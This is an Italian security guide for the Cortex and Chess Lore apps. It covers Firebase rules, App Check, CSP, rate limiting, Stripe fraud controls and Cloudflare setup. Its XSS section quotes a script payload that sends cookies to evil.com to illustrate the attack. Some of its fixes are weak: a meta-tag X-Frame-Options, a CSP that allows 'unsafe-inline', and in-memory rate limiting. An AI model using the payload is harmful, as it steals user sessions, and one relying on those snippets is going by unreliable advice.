# Security Guide — Cortex & Chess Lore
*Analisi completa degli attacchi possibili e come difendersi*
*Basato su OWASP Top 10:2025 + best practice Firebase/PWA*

---

## TL;DR — Le 5 cose da fare ADESSO prima di andare live

1. **Lockdown Firestore Rules** — le regole di default permettono tutto a chiunque
2. **Metti Cloudflare davanti al dominio** — gratis, blocca DDoS e bot
3. **Aggiungi Content-Security-Policy nell'HTML** — blocca XSS
4. **Non esporre mai API keys nel codice frontend** — usa environment variables
5. **Abilita Firebase App Check** — blocca richieste che non vengono dalla tua app

---

## PARTE 1 — Gli Attacchi Più Pericolosi

### 🔴 CRITICO — Firestore Rules aperte (il rischio più immediato)

**Cos'è:** Se le Firestore Security Rules non sono configurate correttamente, chiunque con la tua Firebase config (che è pubblica nel codice frontend!) può leggere, scrivere, cancellare TUTTI i dati di tutti gli utenti.

**Come funziona l'attacco:** Un attaccante apre la tua app, fa F12, copia la firebase config dall'HTML, scrive uno script da 5 righe, e svuota il tuo database in 30 secondi.

**Soluzione — regole minime sicure per Cortex:**
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Ogni utente può leggere/scrivere SOLO i propri dati
    match /users/{userId}/{document=**} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    // Nessun accesso di default a tutto il resto
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

---

### 🔴 CRITICO — API Key esposte nel frontend

**Cos'è:** La Firebase config (apiKey, projectId, ecc.) è visibile nel codice JavaScript. Questo è normale e previsto da Firebase — MA se non hai le Security Rules corrette e App Check attivo, quella key è un master pass per tutto.

**Soluzione:**
- Firestore Rules strette (vedi sopra)
- Abilita **Firebase App Check** con reCAPTCHA v3 — verifica che le richieste vengano dalla tua app vera, non da script esterni
- Per le chiamate alle Cloud Functions (Gemini, Stripe), usa sempre autenticazione Firebase — mai endpoints pubblici

---

### 🔴 CRITICO — Stripe abuse e frodi

**Cos'è:** Bot che testano centinaia di carte rubate sul tuo checkout. Ti fanno pagare le transaction fees anche per i tentativi falliti, e Stripe può sospendere l'account per alto tasso di frodi.

**Soluzione:**
- Usa **Stripe Radar** (incluso gratis) — blocca automaticamente pattern sospetti
- Aggiungi **reCAPTCHA v3** prima del checkout
- Imposta rate limiting nelle Cloud Functions: max 3 tentativi di pagamento per IP per ora
- Abilita notifiche email Stripe per ogni nuovo abbonamento

---

### 🟡 ALTO — XSS (Cross-Site Scripting)

**Cos'è:** Un attaccante inietta codice JavaScript malevolo nella tua app. Se un utente può inserire testo che viene mostrato ad altri utenti (es. nome del mazzo in Cortex), quel testo potrebbe contenere `<script>alert('rubato')</script>`.

**Come funziona:** L'attaccante crea un mazzo chiamato `<script>document.location='https://evil.com?cookie='+document.cookie</script>`. Se non sanitizzi, esegui quel codice per tutti gli utenti che vedono quel mazzo.

**Soluzione:**
```html
<!-- Aggiungi in <head> dell'HTML — blocca l'esecuzione di script non autorizzati -->
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self' 'unsafe-inline' https://www.gstatic.com https://apis.google.com https://code.jquery.com https://unpkg.com;
           style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
           font-src https://fonts.gstatic.com;
           connect-src 'self' https://*.firebaseapp.com https://*.firebase.com wss://*.firebaseapp.com;
           img-src 'self' data: https:;">
```

Nel codice JS, **mai** usare `innerHTML` con dati che vengono dall'utente — usa sempre `textContent`:
```javascript
// ❌ PERICOLOSO
element.innerHTML = userData.name;

// ✅ SICURO
element.textContent = userData.name;
```

---

### 🟡 ALTO — DDoS (Distributed Denial of Service)

**Cos'è:** Migliaia di bot mandano richieste alla tua app simultaneamente finché il server crolla o ti arriva una bolletta Firebase enorme.

**Realtà per un indie developer:** non sei Netflix, quindi non sarai target di attacchi da 31 Tbps. Ma bot automatici che scansionano internet potrebbero colpirti per caso, o un concorrente cattivo potrebbe farlo apposta.

**Soluzione — gratis e immediata:**
1. **Cloudflare** (free tier) davanti a cortexapp.it e chesslore.it — assorbe DDoS, blocca bot, CDN globale incluso
2. **Firebase Hosting** ha protezione DDoS integrata di Google — già sei parzialmente protetto
3. Nelle **Cloud Functions** aggiungi rate limiting per IP:
```javascript
const rateLimit = new Map();

function checkRateLimit(ip, maxCalls = 10, windowMs = 60000) {
  const now = Date.now();
  const calls = rateLimit.get(ip) || [];
  const recent = calls.filter(t => now - t < windowMs);
  if (recent.length >= maxCalls) return false;
  rateLimit.set(ip, [...recent, now]);
  return true;
}
```

---

### 🟡 ALTO — Firebase Storage abuse

**Cos'è:** Se permetti upload di file (es. foto profilo in Cortex), senza regole strette qualcuno può usare il tuo Storage come hosting gratuito per file illegali, svuotando la tua quota.

**Soluzione — regole Storage:**
```javascript
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /users/{userId}/{allPaths=**} {
      allow read: if request.auth != null;
      allow write: if request.auth != null
                   && request.auth.uid == userId
                   && request.resource.size < 2 * 1024 * 1024  // max 2MB
                   && request.resource.contentType.matches('image/.*'); // solo immagini
    }
  }
}
```

---

### 🟠 MEDIO — Session hijacking / Account takeover

**Cos'è:** Un attaccante ruba il token di sessione di un utente e prende controllo del suo account. Di solito avviene via XSS (vedi sopra) o reti WiFi pubbliche senza HTTPS.

**Soluzione:**
- Firebase Auth usa token JWT con scadenza — già protetto by design
- **HTTPS sempre** — Firebase Hosting lo forza automaticamente
- Aggiungi `Strict-Transport-Security` header
- Considera **Google Sign-In** come metodo principale — toglie a te la responsabilità delle password

---

### 🟠 MEDIO — Scraping / Furto contenuti

**Cos'è:** Un concorrente fa scraping automatico di tutti i tuoi contenuti (le storie di Chess Lore, i contenuti di Cortex) per riusarli nella sua app.

**Soluzione:**
- **Robots.txt** per i crawler onesti
- Rate limiting sulle API (max X richieste per minuto per IP)
- Filigrana digitale nei contenuti testuali (difficile ma possibile)
- Per contenuti premium, non caricarli mai nel bundle JS — caricali on-demand da Firestore solo agli utenti autenticati e abbonati

---

### 🟠 MEDIO — Dependency vulnerabilities (Supply Chain)

**Cos'è:** Una delle librerie che usi (chess.js, chessboard.js, vite, ecc.) ha una vulnerabilità di sicurezza conosciuta che un attaccante può sfruttare. È il nuovo #3 OWASP 2025.

**Soluzione:**
```bash
# Controlla vulnerabilità note nelle dipendenze
npm audit

# Fix automatico quando possibile
npm audit fix

# Tienilo in routine: fallo ogni mese
```

---

### 🟢 BASSO — Clickjacking

**Cos'è:** Un sito malevolo mette la tua app in un iframe invisibile. L'utente pensa di cliccare sul sito cattivo, ma in realtà sta cliccando su azioni nella tua app (es. cancella account, conferma pagamento).

**Soluzione — una riga nell'HTML:**
```html
<meta http-equiv="X-Frame-Options" content="DENY">
```

---

### 🟢 BASSO — Enumerazione utenti

**Cos'è:** Un attaccante prova email a caso e capisce quali sono registrate dalla risposta del tuo sistema ("email non trovata" vs "password errata"). Poi vende quella lista.

**Soluzione:** Firebase Auth di default NON distingue tra "email non esiste" e "password sbagliata" — sei già protetto. Non aggiungere messaggi di errore specifici.

---

## PARTE 2 — Checklist Completa Pre-Launch

### Firebase & Backend
- [ ] Firestore Security Rules configurate e testate con Firebase Emulator
- [ ] Storage Security Rules con limite dimensione e tipo file
- [ ] Firebase App Check abilitato (reCAPTCHA v3)
- [ ] Cloud Functions con rate limiting per IP
- [ ] Firebase Authentication: solo metodi necessari abilitati
- [ ] Billing alerts su Firebase Console (es. alert a €50)
- [ ] Firebase project in modalità "produzione" (non test)

### Frontend & HTML
- [ ] Content-Security-Policy header nell'HTML
- [ ] X-Frame-Options: DENY
- [ ] Nessun `innerHTML` con dati utente
- [ ] HTTPS forzato (Firebase Hosting lo fa automaticamente)
- [ ] Nessuna API key sensibile hardcoded nel JS frontend

### Infrastruttura
- [ ] Cloudflare attivo sul dominio (gratis, DDoS + CDN)
- [ ] DNS configurato con record SPF/DKIM per l'email (evita spoofing)
- [ ] `npm audit` pulito (zero vulnerabilità critiche)

### Stripe & Pagamenti
- [ ] Stripe Radar attivo (gratis, blocca frodi)
- [ ] Webhook Stripe con signature verification
- [ ] Notifiche email per ogni nuovo abbonamento
- [ ] Test in Stripe test mode prima di andare live

### Monitoraggio
- [ ] Firebase Crashlytics per errori runtime
- [ ] Google Analytics o Firebase Analytics per traffic anomalie
- [ ] Alert su Firebase Console per spike di letture/scritture Firestore inusuali

---

## PARTE 3 — Setup Cloudflare (15 minuti, gratis)

Cloudflare è la prima linea di difesa. Va fatto PRIMA di puntare il dominio a Firebase.

1. Vai su cloudflare.com → crea account gratuito
2. Aggiungi il tuo dominio (cortexapp.it / chesslore.it)
3. Cloudflare ti dà 2 nameserver da impostare sul tuo registrar (Aruba, Register.it)
4. Nella dashboard Cloudflare:
   - **SSL/TLS** → Full (strict)
   - **Security** → WAF → abilita "Managed Rules" (gratis)
   - **Speed** → Auto Minify → JS + CSS + HTML
   - **Caching** → Browser Cache TTL → 4 hours

Con Cloudflare attivo, il tuo server Firebase non riceve MAI traffico diretto — tutto passa da Cloudflare che filtra.

---

## PARTE 4 — Firebase App Check (il più importante che nessuno fa)

App Check garantisce che solo la tua vera app possa chiamare Firebase. Senza di esso, chiunque con la tua config può fare richieste Firestore dal terminale.

```javascript
// In main.js, PRIMA di tutto il resto
import { initializeApp } from 'firebase/app';
import { initializeAppCheck, ReCaptchaV3Provider } from 'firebase/app-check';

const app = initializeApp(firebaseConfig);

// Abilita App Check con reCAPTCHA v3
const appCheck = initializeAppCheck(app, {
  provider: new ReCaptchaV3Provider('LA_TUA_RECAPTCHA_V3_SITE_KEY'),
  isTokenAutoRefreshEnabled: true
});
```

Poi nella Firebase Console → App Check → enforce per Firestore e Functions.

---

## PARTE 5 — Cosa NON devi temere (realisticamente)

Da indie developer con utenti reali ma non milioni:

- **SQL Injection** — non usi SQL, usi Firestore. Non applicabile.
- **Server compromise** — non hai server. Firebase è gestito da Google. Non applicabile.
- **Attacchi zero-day su infrastruttura** — problema di Google, non tuo.
- **Attacchi DDoS da 31 Tbps** — target sono Netflix, Cloudflare, governi. Non tu.
- **Nation-state attacks** — idem.

Il 90% del rischio reale per te è: Firestore Rules sbagliate + nessun rate limiting + Stripe senza Radar. Quelle tre cose risolte, sei già al livello di sicurezza di molte startup serie.

---

*Aggiornato: 9 Maggio 2026 | Basato su OWASP Top 10:2025*
*Fonti: owasp.org, firebase.google.com/docs/rules, firebase.google.com/docs/app-check*
